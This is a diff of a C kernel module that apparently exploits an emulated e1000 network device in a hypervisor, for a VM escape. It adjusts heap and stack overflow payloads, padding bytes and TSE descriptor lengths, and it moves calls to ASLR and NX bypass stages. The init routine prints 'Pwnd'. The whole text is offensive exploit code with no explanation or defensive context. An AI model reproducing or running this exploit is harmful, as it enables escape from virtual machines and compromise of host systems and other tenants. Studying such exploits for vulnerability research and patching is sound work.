@@ -63,7 +63,7 @@ static int __init e1k_init(void)
 	e1k_configure();	
 	aslr_bypass();
 
-	nx_bypass();
+	//nx_bypass();
 	
 	pr_info("Pwnd");
 	return 0;
@@ -126,10 +126,6 @@ static void e1k_configure(void)
 		pr_info("e1k : failed to allocate TX Buffer\n");
 		return;
 	}
-	// Payload setup
-	for (i = 0; i < PAYLOAD_LEN-50; ++i) {
-		tx_buffer[i] = 0x61; // Fill with garbage "a"
-	}
 
 	tdba = (uint64_t)((uintptr_t) virt_to_phys(tx_ring));
 	set_register(TDBAL, (uint32_t) ((tdba & 0xFFFFFFFFULL)));
@@ -165,6 +161,7 @@ static void disable_loopback(void)
  */
 static void heap_overflow(uint16_t new_addr)
 {
+	int i;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -187,6 +184,10 @@ static void heap_overflow(uint16_t new_addr)
 	 *		- uint16_t	m_u16Addr			(16 bits)
 	 * 		... 
 	 */
+	// Payload setup
+	for (i = 0; i < PAYLOAD_LEN-50; ++i) {
+		tx_buffer[i] = 0x61; // Fill with garbage "a"
+	}
 	memcpy(&(tx_buffer[PAYLOAD_LEN - 140]), mu16Data, 128);
 	tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
 	tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
@@ -359,6 +360,7 @@ static uint64_t aslr_bypass(void)
 
 static void stack_overflow(void)
 {
+	int i;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -370,9 +372,15 @@ static void stack_overflow(void)
 
 	//------------- Payload setup -------------//
 
-	//...
-	tx_buffer[PAYLOAD_LEN - 164]	= 0x00;
-	tx_buffer[PAYLOAD_LEN - 163]	= 0xc0;
+	// Payload setup
+	for (i = 0; i < (0x3F90); ++i) {
+		tx_buffer[i] = 0x61; // Fill with garbage "a"
+	}
+	for (i = 0x3F98; i < (0x4010); ++i) {
+		tx_buffer[i] = 0x61; // Fill with garbage "a"
+	}
+	//tx_buffer[PAYLOAD_LEN - 164]	= 0x20;
+	//tx_buffer[PAYLOAD_LEN - 163]	= 0xc0;
 	tx_buffer[PAYLOAD_LEN - 152]	= 0x00;
 	tx_buffer[PAYLOAD_LEN - 151]	= 0x00;
 
@@ -396,11 +404,11 @@ static void stack_overflow(void)
 	
 	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
 	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
-	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | STACK_LEN);
+	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | 0x4010);
 	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
 	
 	data_5->buffer_addr				= (uint64_t) physical_address;
-	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | STACK_LEN | TSE);
+	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | 0x4010 | TSE);
 	data_5->upper.data				= (uint32_t) 0;
 	//-----------------------------------------//
 
@@ -416,6 +424,6 @@ static void nx_bypass(void)
 {
 	pr_info("##### Stage 2 #####\n");
 	enable_loopback();
-	//stack_overflow();
+	stack_overflow();
 	disable_loopback();
 }
